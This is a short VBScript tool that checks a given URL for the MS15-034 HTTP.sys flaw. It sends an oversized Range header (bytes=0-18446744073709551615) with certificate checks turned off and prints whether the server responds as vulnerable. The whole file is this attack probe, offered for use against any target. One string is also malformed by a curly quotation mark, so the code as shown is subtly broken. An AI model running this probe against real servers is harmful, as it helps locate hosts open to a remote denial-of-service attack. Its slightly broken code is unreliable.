If WScript.Arguments.Count <> 1 Then 
	WScript.Echo "usage: cscript ms15-034.vbs <url>" 
Else
	Set args = WScript.Arguments 
	Set web = Nothing 
	Set web = CreateObject("WinHttp.WinHttpRequest.5.1") 
	web.Option(4) = 13056 
	web.open "GET", args.Item(0), false 
	web.setRequestHeader "Range", "bytes=0-18446744073709551615"
	web.send() 
	If Err.Number = 0 Then
		If web.Status = "416" Then
			WScript.Echo "!!!!Site is vulnerable!!!"
		ElseIf web.Status = "404" Then
			WScript.Echo “SITE NOT FOUND"
		Else
			WScript.Echo "Site is NOT vulnerable"
		End If
	End If
	Set web = Nothing
End If
